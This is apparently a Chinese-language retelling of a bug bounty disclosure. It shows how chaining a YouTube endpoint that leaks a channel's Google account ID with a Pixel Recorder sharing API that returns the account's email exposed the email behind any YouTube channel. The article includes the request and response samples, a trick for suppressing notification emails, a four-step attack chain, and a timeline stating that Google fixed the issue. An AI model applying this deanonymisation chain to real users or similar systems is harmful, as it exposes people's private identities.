#  价值 10000$的可查看任何 YouTube 用户的电子邮件漏洞披露   
 独眼情报   2025-02-13 03:33  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSNI0Tibr6pBTEZXm5DCzUxISG8GkIRZyhPO1WR5VqXmynoG7fksibVNE3NyY4hovugHia4XItVP4rLA/640?wx_fmt=png&from=appmsg "")  
  
前些时候，我在Google的研究目标中翻查Internal People API（测试版）的发现文档时，注意到一个有趣的现象：  
```
"BlockedTarget": {
  "id": "BlockedTarget",
  "description": "用户间屏蔽功能的目标对象，用于指定屏蔽关系的创建/删除。",
  "type": "object",
  "properties": {
    "profileId": {
      "description": "必填。被屏蔽用户的混淆Gaia ID。",
      "type": "string"
    },
    "fallbackName": {
      "description": "在`BlockPeopleRequest`中必填。被屏蔽用户的显示名称。当被屏蔽用户没有可见资料名称时，查看者可能会在其他界面看到此名称。注意：* `BlockPeopleRequest`中必填（当前验证可能未强制要求，但建议提供）* `UnblockPeopleRequest`中无需设置。",
      "type": "string"
    }
  }
}

```  
  
Google全平台的用户屏蔽功能似乎基于混淆的Gaia ID和显示名称。其中混淆Gaia ID是Google账号的标识符。这看起来很正常，直到我回想起这个支持页面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSNI0Tibr6pBTEZXm5DCzUxI4SNGy8dxKyvYXsgmqVR8DBJT4zVOBLHXLDcxAaWIUYqTg15wXeSYsg/640?wx_fmt=png&from=appmsg "")  
  
通过YouTube屏蔽用户竟会泄露其Google账号标识符？我立即测试：在一个直播中屏蔽用户后，屏蔽列表果然显示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSNI0Tibr6pBTEZXm5DCzUxIoNrOk7KUj7EIKoficv1q3CDJdn2oJYCTjZX7eQc1JepTYcW8s4o4kKA/640?wx_fmt=png&from=appmsg "")  
  
其中fallbackName是频道名**Mega Prime**，profileId则是其混淆Gaia ID**107183641464576740691**。YouTube本不应暴露频道背后的Google账号，这显然存在问题。历史上曾多次出现通过Gaia ID反查邮箱的漏洞，我确信某些旧系统仍存有这种关联。  
## 将影响范围扩展到40亿YouTube频道  
  
我们虽然能获取直播用户的Gaia ID，但如何扩展到所有YouTube频道？当点击频道菜单的"..."时，会触发请求：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnSNI0Tibr6pBTEZXm5DCzUxIrW19JNjxNMRGZibeVExGWQIYUb78J9yDdDU4uicpGOnaB8iauXDhKtfzw/640?wx_fmt=png&from=appmsg "")  
  
**请求**  
```
POST /youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9&pbj=1&prettyPrint=false HTTP/2
Host: www.youtube.com

```  
  
**响应中的protobuf参数**  
```
$ echo -n "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=" | base64 -d | protoc --decode_raw
1 {
  5 { 1: "UChs0pSaEoNLV4mevBFGaoKA" }
}
12 { 1: "113907466537670370590" } # 目标用户的Gaia ID

```  
  
通过篡改请求参数中的频道ID，我们成功获取到自动生成的主题频道（如UCD2LZAT1j1DyVXq2R2BdusQ）的Gaia ID**103261974221829892167**。  
## 关键拼图：Pixel Recorder  
  
在Pixel Recorder的分享功能中，我们发现其API端点可直接将Gaia ID转换为邮箱：  
  
**请求**  
```
POST /$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList HTTP/2
Host: pixelrecorder-pa.clients6.google.com
["7adab89e-4ace-4945-9f75-6fe250ccbe49",null,[["113769094563819690011",2,null]]]

```  
  
**响应**  
```
["28bc3792-9bdb-4aed-9a78-17b0954abc7d",[[null,2,"vrptest2@gmail.com"]]]

```  
  
通过设置超长标题（250万字符）规避通知邮件后，完整的攻击链形成：  
1. 通过YouTube接口泄露目标频道的混淆Gaia ID  
  
1. 在Pixel Recorder创建超长标题的录音并分享给目标Gaia ID  
  
1. 通过API响应获取目标邮箱  
  
1. 清理分享记录  
  
### 时间线  
- 2024/09/15 - 提交漏洞报告  
  
- 2024/09/16 - Google确认漏洞  
  
- 2024/10/03 - 初始修复（YouTube端Gaia ID泄露）  
  
- 2024/11/05 - 获得$3,133奖金  
  
- 2024/12/03 - 追加$7,500奖金（完整攻击链评估）  
  
- 2025/02/09 - 确认所有漏洞修复完成  
  
- 2025/02/12 - 公开披露  
  
该漏洞链展示了现代复杂系统中，跨产品API交互可能引发的隐蔽数据泄露风险。即便单个环节看似无害，组合利用仍可能造成重大影响。  
  
  
